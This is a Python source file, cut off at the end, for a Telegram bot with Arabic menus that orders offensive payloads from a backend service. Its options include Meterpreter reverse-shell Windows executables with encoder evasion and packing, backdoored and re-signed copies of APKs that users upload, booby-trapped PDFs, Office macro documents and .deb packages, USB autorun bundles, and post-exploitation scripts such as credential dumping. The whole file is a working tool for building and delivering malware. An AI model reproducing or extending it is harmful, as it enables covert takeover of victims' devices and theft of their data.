import asyncio
import json
import os
import logging
import hashlib
try:
    import magic  # libmagic-based
    _USE_MAGIC = True
except Exception:
    magic = None
    _USE_MAGIC = False
import zipfile
import xml.etree.ElementTree as ET
from dataclasses import dataclass
from typing import Dict, Any, Optional, List
from pathlib import Path
import aiofiles
import aiohttp
from datetime import datetime, timedelta
import ipaddress

import httpx
from dotenv import load_dotenv
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

load_dotenv()

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logger = logging.getLogger(__name__)

ORCH_URL = os.environ.get("ORCH_URL", "http://127.0.0.1:8000")
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
OWNER_ID = int(os.environ.get("TELEGRAM_OWNER_ID", "0"))

# Phase 0 flags
REQUIRE_OWNER_ID = os.environ.get("REQUIRE_OWNER_ID", "false").lower() == "true"
ORCH_AUTH_TOKEN = os.environ.get("ORCH_AUTH_TOKEN", "")
ENABLE_HTTP_ARTIFACTS = os.environ.get("ENABLE_HTTP_ARTIFACTS", "false").lower() == "true"

# File upload configuration
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
ALLOWED_EXTENSIONS = ['.apk']
UPLOAD_DIR = Path("/workspace/uploads")
TEMP_DIR = Path("/workspace/temp")

# Ensure directories exist
UPLOAD_DIR.mkdir(exist_ok=True)
TEMP_DIR.mkdir(exist_ok=True)

MENU, PARAMS, UPLOAD_APK, UPLOAD_PARAMS = range(4)

# Concise env check at startup (non-fatal)
def _env_summary():
    flags = {
        "REQUIRE_OWNER_ID": REQUIRE_OWNER_ID,
        "ORCH_AUTH_TOKEN": bool(ORCH_AUTH_TOKEN),
    }
    have_owner = OWNER_ID != 0
    logger.info("BOT-ENV: owner_set=%s, flags=%s, orch_url=%s", have_owner, flags, ORCH_URL)
    if REQUIRE_OWNER_ID and not have_owner:
        logger.error("REQUIRE_OWNER_ID enabled but TELEGRAM_OWNER_ID not set. Exiting.")
        raise SystemExit(2)

_env_summary()

def _valid_host(value: str) -> bool:
    try:
        ipaddress.ip_address(value)
        return True
    except Exception:
        # Allow simple hostnames (letters, digits, hyphens, dots) 1-253 chars
        if len(value) == 0 or len(value) > 253:
            return False
        return all(part and len(part) <= 63 and all(c.isalnum() or c == '-' for c in part) for part in value.split('.'))

def _valid_port(value: str) -> bool:
    if not value.isdigit():
        return False
    p = int(value)
    return 1 <= p <= 65535

@dataclass
class Session:
    kind: Optional[str] = None
    params: Dict[str, str] = None
    task_id: Optional[str] = None
    adv: bool = False
    upload_file_path: Optional[str] = None
    upload_file_info: Optional[Dict] = None

@dataclass
class FileUploadInfo:
    file_id: str
    file_name: str
    file_size: int
    file_path: str
    mime_type: str
    checksum: str
    upload_time: datetime
    user_id: int

class APKValidator:
    """Advanced APK validation and analysis"""
    
    @staticmethod
    async def validate_apk_file(file_path: Path) -> Dict[str, Any]:
        """Comprehensive APK validation"""
        result = {
            "valid": False,
            "errors": [],
            "warnings": [],
            "info": {}
        }
        
        try:
            # Check file exists and size
            if not file_path.exists():
                result["errors"].append("File does not exist")
                return result
                
            file_size = file_path.stat().st_size
            if file_size == 0:
                result["errors"].append("File is empty")
                return result
                
            if file_size > MAX_FILE_SIZE:
                result["errors"].append(f"File too large: {file_size} bytes")
                return result
            
            # Check MIME type
            mime_type = None
            if _USE_MAGIC:
                try:
                    mime_type = magic.from_file(str(file_path), mime=True)
                except Exception:
                    mime_type = None
            if not mime_type:
                try:
                    import filetype
                    kind = filetype.guess(str(file_path))
                    if kind:
                        mime_type = kind.mime
                except Exception:
                    mime_type = None
            if mime_type not in ['application/vnd.android.package-archive', 'application/zip', None]:
                result["warnings"].append(f"Unexpected MIME type: {mime_type}")
            
            # Validate ZIP structure
            try:
                with zipfile.ZipFile(file_path, 'r') as apk_zip:
                    file_list = apk_zip.namelist()
                    # Check required APK files
                    required_files = ['AndroidManifest.xml', 'classes.dex']
                    missing_files = [f for f in required_files if f not in file_list]
                    if missing_files:
                        result["errors"].append(f"Missing required files: {missing_files}")
                        return result
                    # Extract basic info
                    result["info"]["file_count"] = len(file_list)
                    result["info"]["has_native_libs"] = any(f.startswith('lib/') for f in file_list)
                    result["info"]["has_resources"] = 'resources.arsc' in file_list
            except zipfile.BadZipFile:
                result["errors"].append("Corrupted ZIP/APK file")
                return result
            
            # Calculate checksum
            checksum = await APKValidator.calculate_checksum(file_path)
            result["info"]["checksum"] = checksum
            result["info"]["file_size"] = file_size
            
            result["valid"] = True
            return result
            
        except Exception as e:
            result["errors"].append(f"Validation error: {str(e)}")
            return result
    
    @staticmethod
    async def calculate_checksum(file_path: Path) -> str:
        """Calculate SHA256 checksum of file"""
        sha256_hash = hashlib.sha256()
        async with aiofiles.open(file_path, "rb") as f:
            while chunk := await f.read(8192):
                sha256_hash.update(chunk)
        return sha256_hash.hexdigest()
    
    @staticmethod
    async def extract_apk_metadata(file_path: Path) -> Dict[str, Any]:
        """Extract APK metadata using aapt or manual parsing"""
        metadata = {}
        
        try:
            # Try to extract manifest info
            with zipfile.ZipFile(file_path, 'r') as apk_zip:
                # Get basic file info
                info_list = apk_zip.infolist()
                metadata["total_files"] = len(info_list)
                metadata["compressed_size"] = sum(info.compress_size for info in info_list)
                metadata["uncompressed_size"] = sum(info.file_size for info in info_list)
                
                # Check for specific directories/files
                metadata["has_assets"] = any(f.filename.startswith('assets/') for f in info_list)
                metadata["has_res"] = any(f.filename.startswith('res/') for f in info_list)
                metadata["has_meta_inf"] = any(f.filename.startswith('META-INF/') for f in info_list)
                
                # Count DEX files
                dex_files = [f for f in apk_zip.namelist() if f.endswith('.dex')]
                metadata["dex_count"] = len(dex_files)
                
                # Check for native libraries
                native_libs = [f for f in apk_zip.namelist() if f.startswith('lib/')]
                if native_libs:
                    archs = set()
                    for lib in native_libs:
                        parts = lib.split('/')
                        if len(parts) >= 2:
                            archs.add(parts[1])
                    metadata["native_architectures"] = list(archs)
                
        except Exception as e:
            logger.error(f"Error extracting APK metadata: {e}")
            metadata["extraction_error"] = str(e)
        
        return metadata

class SecureFileManager:
    """Secure file management with encryption and cleanup"""
    
    @staticmethod
    async def save_uploaded_file(file_path: str, user_id: int, original_name: str) -> FileUploadInfo:
        """Securely save uploaded file with metadata"""
        
        # Generate unique filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_hash = hashlib.md5(f"{user_id}_{timestamp}_{original_name}".encode()).hexdigest()[:8]
        secure_filename = f"{timestamp}_{file_hash}_{original_name}"
        
        secure_path = UPLOAD_DIR / secure_filename
        
        # Move file to secure location
        temp_path = Path(file_path)
        if temp_path.exists():
            temp_path.rename(secure_path)
        
        # Calculate checksum
        checksum = await APKValidator.calculate_checksum(secure_path)
        
        # Get file info
        file_size = secure_path.stat().st_size
        mime_type = magic.from_file(str(secure_path), mime=True) if _USE_MAGIC else "application/octet-stream"
        
        return FileUploadInfo(
            file_id=file_hash,
            file_name=original_name,
            file_size=file_size,
            file_path=str(secure_path),
            mime_type=mime_type,
            checksum=checksum,
            upload_time=datetime.now(),
            user_id=user_id
        )
    
    @staticmethod
    async def cleanup_old_files(max_age_hours: int = 24):
        """Clean up old uploaded files"""
        cutoff_time = datetime.now() - timedelta(hours=max_age_hours)
        
        for file_path in UPLOAD_DIR.glob("*"):
            if file_path.is_file():
                file_time = datetime.fromtimestamp(file_path.stat().st_mtime)
                if file_time < cutoff_time:
                    try:
                        file_path.unlink()
                        logger.info(f"Cleaned up old file: {file_path}")
                    except Exception as e:
                        logger.error(f"Error cleaning up file {file_path}: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("/start received from user_id=%s", getattr(update.effective_user, "id", None))
    if REQUIRE_OWNER_ID:
        if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
            if update.message:
                await update.message.reply_text("تم رفض الوصول.")
            elif update.callback_query:
                await update.callback_query.answer("تم رفض الوصول.", show_alert=True)
            return ConversationHandler.END
    
    kb = [
        [InlineKeyboardButton("بايلود ويندوز", callback_data="kind:payload")],
        [InlineKeyboardButton("EXE متقدم (Windows)", callback_data="kind:winexe")],
        [InlineKeyboardButton("مستمع (Listener)", callback_data="kind:listener")],
        [InlineKeyboardButton("Android APK", callback_data="kind:android")],
        [InlineKeyboardButton("📱 تعديل APK مرسل", callback_data="kind:upload_apk")],
        [InlineKeyboardButton("PDF مضمَّن", callback_data="kind:pdf")],
        [InlineKeyboardButton("مستند Office", callback_data="kind:office")],
        [InlineKeyboardButton("حزمة .deb", callback_data="kind:deb")],
        [InlineKeyboardButton("حزمة Autorun", callback_data="kind:autorun")],
        [InlineKeyboardButton("ما بعد الاستغلال", callback_data="kind:postex")],
    ]
    intro = (
        "اختر نوع المهمة:\n"
        "- بايلود ويندوز: توليد ملف EXE يحتوي اتصال عكسي (Meterpreter).\n"
        "- مستمع: تشغيل مستمع لالتقاط الاتصال على LHOST/LPORT.\n"
        "- Android APK: حقن حمولة داخل ملف APK عيّنة وإرساله لك.\n"
        "- 📱 تعديل APK مرسل: رفع ملف APK وتعديله تلقائياً مع حقن الحمولة."
    )
    if update.message:
        await update.message.reply_text(intro, reply_markup=InlineKeyboardMarkup(kb))
    else:
        await update.callback_query.edit_message_text(intro, reply_markup=InlineKeyboardMarkup(kb))
    context.user_data["session"] = Session(kind=None, params={})
    return MENU

async def handle_uploaded_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded APK files"""
    if REQUIRE_OWNER_ID:
        if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
            await update.message.reply_text("تم رفض الوصول.")
            return ConversationHandler.END
    
    if not update.message.document:
        await update.message.reply_text("يرجى إرسال ملف APK صحيح.")
        return UPLOAD_APK
    
    document = update.message.document
    
    # Check file extension
    if not document.file_name.lower().endswith('.apk'):
        await update.message.reply_text("الملف يجب أن يكون بصيغة APK.")
        return UPLOAD_APK
    
    # Check file size
    if document.file_size > MAX_FILE_SIZE:
        await update.message.reply_text(f"حجم الملف كبير جداً. الحد الأقصى: {MAX_FILE_SIZE // (1024*1024)}MB")
        return UPLOAD_APK
    
    try:
        # Send progress message
        progress_msg = await update.message.reply_text("🔄 جاري تحميل الملف...")
        
        # Download file
        file = await context.bot.get_file(document.file_id)
        temp_path = TEMP_DIR / f"temp_{document.file_id}.apk"
        
        # Download with progress tracking
        await download_file_with_progress(file.file_path, temp_path, progress_msg, context.bot, update.effective_chat.id)
        
        # Validate APK
        await progress_msg.edit_text("🔍 جاري فحص ملف APK...")
        validation_result = await APKValidator.validate_apk_file(temp_path)
        
        if not validation_result["valid"]:
            await progress_msg.edit_text(f"❌ ملف APK غير صحيح:\n{chr(10).join(validation_result['errors'])}")
            temp_path.unlink(missing_ok=True)
            return UPLOAD_APK
        
        # Extract metadata
        await progress_msg.edit_text("📊 جاري استخراج معلومات التطبيق...")
        metadata = await APKValidator.extract_apk_metadata(temp_path)
        
        # Save file securely
        await progress_msg.edit_text("💾 جاري حفظ الملف بشكل آمن...")
        file_info = await SecureFileManager.save_uploaded_file(
            str(temp_path), 
            update.effective_user.id, 
            document.file_name
        )
        
        # Store in session
        sess: Session = context.user_data.get("session", Session())
        sess.upload_file_path = file_info.file_path
        sess.upload_file_info = {
            "file_id": file_info.file_id,
            "original_name": file_info.file_name,
            "file_size": file_info.file_size,
            "checksum": file_info.checksum,
            "metadata": metadata,
            "validation": validation_result
        }
        context.user_data["session"] = sess
        
        # Show file info and ask for parameters
        info_text = (
            f"✅ تم رفع الملف بنجاح!\n\n"
            f"📱 اسم التطبيق: {document.file_name}\n"
            f"📏 حجم الملف: {file_info.file_size / (1024*1024):.2f} MB\n"
            f"🔐 المعرف: {file_info.file_id}\n"
            f"📊 عدد الملفات: {metadata.get('total_files', 'غير معروف')}\n"
            f"⚙️ ملفات DEX: {metadata.get('dex_count', 'غير معروف')}\n"
        )
        
        if metadata.get('native_architectures'):
            info_text += f"🏗️ المعماريات: {', '.join(metadata['native_architectures'])}\n"
        
        info_text += "\nالآن أرسل معاملات الحقن بالصيغة:\nLHOST LPORT [OUTPUT_NAME]"
        
        back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ رجوع", callback_data="back")]])
        await progress_msg.edit_text(info_text, reply_markup=back_kb)
        
        return UPLOAD_PARAMS
        
    except Exception as e:
        logger.error(f"Error handling uploaded file: {e}")
        await update.message.reply_text(f"❌ خطأ في معالجة الملف: {str(e)}")
        return UPLOAD_APK

async def download_file_with_progress(file_url: str, dest_path: Path, progress_msg, bot, chat_id):
    """Download file with progress tracking"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(file_url) as response:
                if response.status != 200:
                    raise Exception(f"Failed to download file: HTTP {response.status}")
                
                total_size = int(response.headers.get('content-length', 0))
                downloaded = 0
                
                async with aiofiles.open(dest_path, 'wb') as f:
                    async for chunk in response.content.iter_chunked(8192):
                        await f.write(chunk)
                        downloaded += len(chunk)
                        
                        # Update progress every 1MB
                        if downloaded % (1024 * 1024) == 0 or downloaded == total_size:
                            if total_size > 0:
                                progress = (downloaded / total_size) * 100
                                await progress_msg.edit_text(f"📥 تحميل: {progress:.1f}% ({downloaded/(1024*1024):.1f}MB)")
                            else:
                                await progress_msg.edit_text(f"📥 تحميل: {downloaded/(1024*1024):.1f}MB")
                                
    except Exception as e:
        logger.error(f"Download error: {e}")
        raise

async def handle_upload_params(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle parameters for uploaded APK processing"""
    sess: Session = context.user_data.get("session")
    if not sess or not sess.upload_file_path:
        await update.message.reply_text("لا توجد جلسة رفع نشطة. استخدم /start")
        return ConversationHandler.END
    
    parts = update.message.text.strip().split()
    if len(parts) < 2:
        await update.message.reply_text("الاستخدام: LHOST LPORT [OUTPUT_NAME]\nمثال: 192.168.1.100 4444 my_app")
        return UPLOAD_PARAMS
    
    lhost, lport = parts[:2]
    if not _valid_host(lhost) or not _valid_port(lport):
        await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة. تأكد من صيغة IP/اسم المضيف ونطاق المنفذ 1-65535.")
        return UPLOAD_PARAMS
    
    output_name = parts[2] if len(parts) >= 3 else sess.upload_file_info["original_name"].replace('.apk', '_backdoored')
    
    # Create task parameters
    sess.params = {
        "mode": "upload_apk",
        "upload_file_path": sess.upload_file_path,
        "file_info": sess.upload_file_info,
        "lhost": lhost,
        "lport": lport,
        "output_name": output_name,
        "payload": "android/meterpreter/reverse_tcp"
    }
    
    # Create task via API with optional Authorization
    headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
    async with httpx.AsyncClient(timeout=600, headers=headers) as client:
        resp = await client.post(f"{ORCH_URL}/tasks", json={"kind": "upload_apk", "params": sess.params})
        resp.raise_for_status()
        data = resp.json()
        task = data["task"]
        sess.task_id = task["id"]
    
    await update.message.reply_text(f"✅ تم إنشاء مهمة تعديل APK: {sess.task_id}\nسيتم معالجة الملف وإرسال النتيجة قريباً...")
    await poll_and_send(update, context, sess)
    return ConversationHandler.END


async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("pong ✅")


async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("أمر غير معروف. استخدم /start لفتح القائمة.")


async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "back":
        return await start(update, context)
    if not data.startswith("kind:"):
        return MENU
    kind = data.split(":", 1)[1]
    sess: Session = context.user_data.get("session")
    sess.kind = kind
    sess.params = {}
    sess.adv = False
    # Support advanced toggle via explicit kinds where applicable
    back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ رجوع", callback_data="back")]])
    if kind == "payload":
        txt = (
            "أرسل المعلمات بهذا الشكل: LHOST LPORT OUTPUT_NAME\n"
            "مثال: 192.168.1.10 4444 win_test\n"
            "ملاحظة: سيتم استخدام payload افتراضي windows/meterpreter/reverse_tcp"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "upload_apk":
        txt = (
            "📱 تعديل APK مرسل\n\n"
            "أرسل ملف APK الآن وسيتم:\n"
            "✅ فحص وتحليل الملف\n"
            "✅ استخراج معلومات التطبيق\n"
            "✅ حقن الحمولة المطلوبة\n"
            "✅ إعادة توقيع التطبيق\n"
            "✅ إرسال النتيجة إليك\n\n"
            "متطلبات الملف:\n"
            "• صيغة APK صحيحة\n"
            "• حجم أقل من 100MB\n"
            "• ملف غير تالف\n\n"
            "أرسل ملف APK الآن..."
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
        return UPLOAD_APK
    elif kind == "winexe":
        sess.adv = True
        txt = (
            "EXE متقدم (Windows).\n"
            "أرسل: LHOST LPORT OUTPUT_NAME ARCH ENCODERS UPX\n"
            "ARCH: x86 أو x64\n"
            "ENCODERS (اختياري): سلسلة مفصولة بفواصل مثل x86/shikata_ga_nai:5,x86/countdown:3\n"
            "UPX: true أو false\n"
            "مثال: 127.0.0.1 4444 win_adv x86 x86/shikata_ga_nai:5 true"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "listener":
        txt = (
            "أرسل المعلمات بهذا الشكل: LHOST LPORT\n"
            "مثال شائع: 0.0.0.0 4444 (يستمع على كل الواجهات)\n"
            "يجب أن تطابق القيم المستخدمة في البايلود."
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "android":
        # Offer advanced android by toggling adv flag via simple instruction
        adv_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("إدخال بسيط", callback_data="kind:android_basic"), InlineKeyboardButton("خيارات متقدمة", callback_data="kind:android_adv")],
            [InlineKeyboardButton("⬅️ رجوع", callback_data="back")]
        ])
        await query.edit_message_text("اختر الوضع:", reply_markup=adv_kb)
        return MENU
    elif data == "kind:android_basic":
        sess.kind = "android"
        sess.adv = False
        await query.edit_message_text(
            "أرسل: LHOST LPORT\nأمثلة: 10.0.2.2 4444 أو 192.168.x.x 4444",
            reply_markup=back_kb
        )
        return PARAMS
    elif data == "kind:android_adv":
        sess.kind = "android"
        sess.adv = True
        txt = (
            "Android متقدم.\n"
            "أرسل: MODE PERM LHOST LPORT [OUTPUT_NAME] [KEYSTORE:ALIAS:STOREPASS:KEYPASS]\n"
            "MODE: backdoor_apk أو standalone\n"
            "PERM: keep أو merge\n"
            "مثال بدون توقيع: backdoor_apk keep 10.0.2.2 4444 myapp\n"
            "مثال مع توقيع: backdoor_apk keep 10.0.2.2 4444 myapp /path/ks.jks:myalias:store:pass"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
        return PARAMS
    elif kind == "pdf":
        # Offer advanced base pdf
        sess.adv = True
        txt = (
            "PDF مضمَّن.\n"
            "أرسل: LHOST LPORT [OUTPUT_NAME] [BASE_PDF_PATH]\n"
            "مثال: 127.0.0.1 4444 report /workspace/PE/original.pdf"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "office":
        txt = (
            "توليد مستند ماكرو.\n"
            "أرسل: TARGET LHOST LPORT OUTPUT_NAME\n"
            "TARGET أحد: ms_word_windows | ms_word_mac | openoffice_windows | openoffice_linux\n"
            "مثال: ms_word_windows 127.0.0.1 4444 invoice\n"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "deb":
        txt = (
            "تلغيم حزمة .deb.\n"
            "أرسل: DEB_PATH LHOST LPORT OUTPUT_NAME\n"
            "مثال: /path/app.deb 127.0.0.1 4444 mydeb\n"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "autorun":
        txt = (
            "حزمة Autorun لوسائط USB/CD.\n"
            "أرسل: [EXE_PATH] [EXE_NAME]\n"
            "مثال مع ملفك: /path/payload.exe myapp.exe\n"
            "أو ارسل سطر فارغ لاستخدام الملف الافتراضي app4.\n"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "postex":
        txt = (
            "تشغيل سكربت ما بعد الاستغلال (rc) عبر msfconsole.\n"
            "أرسل: SCRIPT_NAME [SESSION_ID]\n"
            "أمثلة السكربتات المتوفرة: sysinfo.rc, fast_migrate.rc, cred_dump.rc, gather.rc\n"
            "مثال: sysinfo.rc 1\n"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    else:
        await query.edit_message_text("خيار غير مدعوم")
        return ConversationHandler.END
    return PARAMS


async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sess: Session = context.user_data.get("session")
    if not sess or not sess.kind:
        await update.message.reply_text("لا توجد جلسة نشطة. استخدم /start")
        return ConversationHandler.END
    parts = update.message.text.strip().split()

    if sess.kind in ("payload", "listener"):
        # Validate basic host/port
        need_output = (sess.kind == "payload")
        min_parts = 3 if need_output else 2
        if len(parts) < min_parts:
            await update.message.reply_text("الاستخدام: LHOST LPORT{}".format(" OUTPUT_NAME" if need_output else ""))
            return PARAMS
        lhost, lport = parts[:2]
        if not _valid_host(lhost) or not _valid_port(lport):
            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
            return PARAMS
        if sess.kind == "payload":
            output_name = parts[2]
            payload = "windows/meterpreter/reverse_tcp"
            sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": payload}
        else:
            payload = "windows/meterpreter/reverse_tcp"
            sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
    elif sess.kind == "winexe":
        # advanced windows exe
        if len(parts) < 6:
            await update.message.reply_text("الاستخدام: LHOST LPORT OUTPUT_NAME ARCH ENCODERS UPX\nمثال: 127.0.0.1 4444 win_adv x86 x86/shikata_ga_nai:5 true")
            return PARAMS
        lhost, lport, output_name, arch, encoders, upx = parts[:6]
        if not _valid_host(lhost) or not _valid_port(lport):
            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
            return PARAMS
        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "arch": arch, "encoders": encoders, "upx": upx, "payload": "windows/meterpreter/reverse_tcp"}
    elif sess.kind == "android" and not sess.adv:
        if len(parts) < 2:
            await update.message.reply_text("الاستخدام: LHOST LPORT")
            return PARAMS
        lhost, lport = parts[:2]
        if not _valid_host(lhost) or not _valid_port(lport):
            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
            return PARAMS
        payload = "android/meterpreter/reverse_tcp"
        sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
    elif sess.kind == "android" and sess.adv:
        if len(parts) < 4:
            await update.message.reply_text("الاستخدام: MODE PERM LHOST LPORT [OUTPUT_NAME] [KEYSTORE:ALIAS:STOREPASS:KEYPASS]")
            return PARAMS
        mode, perm, lhost, lport = parts[:4]
        if not _valid_host(lhost) or not _valid_port(lport):
            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
            return PARAMS
        output_name = parts[4] if len(parts) >= 5 else "app_backdoor"
        ks_block = parts[5] if len(parts) >= 6 else ""
        sess.params = {"mode": mode, "perm_strategy": perm, "lhost": lhost, "lport": lport, "output_name": output_name, "payload": "android/meterpreter/reverse_tcp"}
        if ks_block:
            try:
                ks_path, alias, storepass, keypass = ks_block.split(":", 3)
                sess.params.update({"keystore_path": ks_path, "key_alias": alias, "keystore_password": storepass, "key_password": keypass})
            except Exception:
                await update.message.reply_text("صيغة التوقيع غير صحيحة. استخدم: /path/ks.jks:alias:storepass:keypass")
                return PARAMS
    elif sess.kind == "pdf":
        lhost = parts[0] if len(parts) >= 1 else ""
        lport = parts[1] if len(parts) >= 2 else ""
        output_name = parts[2] if len(parts) >= 3 else "document"
        base_pdf = parts[3] if len(parts) >= 4 else ""
        if not _valid_host(lhost) or not _valid_port(lport):
            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
            return PARAMS
        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": "windows/meterpreter/reverse_tcp"}
        if base_pdf:
            sess.params["base_pdf_path"] = base_pdf
    elif sess.kind == "office":
        if len(parts) < 4:
            await update.message.reply_text("الاستخدام: TARGET LHOST LPORT OUTPUT_NAME\nمثال: ms_word_windows 127.0.0.1 4444 invoice")
            return PARAMS
        target, lhost, lport, output_name = parts[:4]
        valid = {"ms_word_windows","ms_word_mac","openoffice_windows","openoffice_linux"}
        if target not in valid or not _valid_host(lhost) or not _valid_port(lport):
            await update.message.reply_text("مدخلات غير صحيحة.")
            return PARAMS
        sess.params = {"suite_target": target, "lhost": lhost, "lport": lport, "payload": "windows/meterpreter/reverse_tcp", "output_name": output_name}
    elif sess.kind == "deb":
        if len(parts) < 4:
            await update.message.reply_text("الاستخدام: DEB_PATH LHOST LPORT OUTPUT_NAME\nمثال: /path/app.deb 127.0.0.1 4444 mydeb")
            return PARAMS
        deb_path, lhost, lport, output_name = parts[:4]
        if not _valid_host(lhost) or not _valid_port(lport):
            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
            return PARAMS
        sess.params = {"deb_path": deb_path, "lhost": lhost, "lport": lport, "output_name": output_name}
    elif sess.kind == "autorun":
        exe_path = parts[0] if len(parts) >= 1 else ""
        exe_name = parts[1] if len(parts) >= 2 else "app4.exe"
        sess.params = {"exe_path": exe_path, "exe_name": exe_name}
    elif sess.kind == "postex":
        if len(parts) < 1:
            await update.message.reply_text("الاستخدام: SCRIPT_NAME [SESSION_ID]\nأمثلة: sysinfo.rc أو sysinfo.rc 1")
            return PARAMS
        script_name = parts[0]
        session_id = parts[1] if len(parts) >= 2 else ""
        sess.params = {"script_name": script_name}
        if session_id:
            sess.params["session_id"] = session_id
    else:
        await update.message.reply_text("خيار غير مدعوم")
        return ConversationHandler.END

    # create task
    headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
    async with httpx.AsyncClient(timeout=600, headers=headers) as client:
        resp = await client.post(f"{ORCH_URL}/tasks", json={"kind": sess.kind, "params": sess.params})
        resp.raise_for_status()
        data = resp.json()
        task = data["task"]
        sess.task_id = task["id"]
    await update.message.reply_text(f"تم إنشاء المهمة: {sess.task_id}\nسيتم تتبع التقدم وإرسال الملفات عند الانتهاء…")
    await poll_and_send(update, context, sess)
    return ConversationHandler.END


async def poll_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, sess: Session):
    chat_id = update.effective_chat.id
    headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
    last_state = None
    delay = 2
    max_delay = 60 * 30  # 30 minutes
    async with httpx.AsyncClient(timeout=600, headers=headers) as client:
        for _ in range(1000):  # enough iterations with backoff
            r = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}")
            r.raise_for_status()
            task = r.json()["task"]
            state = task["state"]
            if state != last_state:
                state_ar = {"SUBMITTED":"تم الإرسال","PREPARING":"جارِ التحضير","RUNNING":"جارِ التنفيذ","SUCCEEDED":"تم بنجاح","FAILED":"فشل","CANCELLED":"أُلغي"}.get(state, state)
                await context.bot.send_message(chat_id, f"الحالة: {state_ar}")
                last_state = state
            if state in ("SUCCEEDED", "FAILED", "CANCELLED"):
                if state == "SUCCEEDED":
                    arts = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}/artifacts")
                    arts.raise_for_status()
                    artifacts = arts.json()
                    # ملخص نهائي
                    summary_lines = []
                    for a in artifacts:
                        name = a["name"]
                        size_b = a.get("size_bytes", 0)
                        sha = a.get("sha256", "")
                        summary_lines.append(f"• {name} | {size_b} bytes | {sha}")
                    await context.bot.send_message(chat_id, "الملخص النهائي للملفات:\n" + "\n".join(summary_lines))
                    # إرسال الملفات نفسها (نفس آلية المرحلة 2)
                    if artifacts:
                        for a in artifacts:
                            name = a["name"]
                            path_or_url = a["path"]
                            try:
                                if ENABLE_HTTP_ARTIFACTS and path_or_url.startswith("/tasks/"):
                                    url = f"{ORCH_URL}{path_or_url}"
                                    async with client.stream("GET", url) as resp:
                                        resp.raise_for_status()
                                        tmpf = TEMP_DIR / f"{sess.task_id}_{name}"
                                        async with aiofiles.open(tmpf, "wb") as f:
                                            async for chunk in resp.aiter_bytes():
                                                await f.write(chunk)
                                    await context.bot.send_document(chat_id, document=InputFile((TEMP_DIR / f"{sess.task_id}_{name}").open("rb"), filename=name), caption="الملف الناتج")
                                    try:
                                        (TEMP_DIR / f"{sess.task_id}_{name}").unlink()
                                    except Exception:
                                        pass
                                else:
                                    with open(path_or_url, "rb") as f:
                                        await context.bot.send_document(chat_id, document=InputFile(f, filename=name), caption="الملف الناتج")
                            except Exception as e:
                                await context.bot.send_message(chat_id, f"تعذّر إرسال {name}: {e}")
                else:
                    # فشل/إلغاء: أرسل رابط تحميل build.log
                    log_url = f"{ORCH_URL}/tasks/{sess.task_id}/logs/build"
                    await context.bot.send_message(chat_id, f"انتهت المهمة بحالة: {state}\nسجل البناء: {log_url}")
                return
            await asyncio.sleep(delay)
            delay = min(delay * 2, max_delay)


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if REQUIRE_OWNER_ID:
        if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
            await update.message.reply_text("تم رفض الوصول.")
            return
    if not context.args:
        await update.message.reply_text("الاستخدام: /cancel <task_id>")
        return
    task_id = context.args[0]
    headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
    async with httpx.AsyncClient(timeout=30, headers=headers) as client:
        r = await client.post(f"{ORCH_URL}/tasks/{task_id}/cancel")
        if r.status_code == 200:
            await update.message.reply_text(f"تم إلغاء المهمة: {task_id}")
        else:
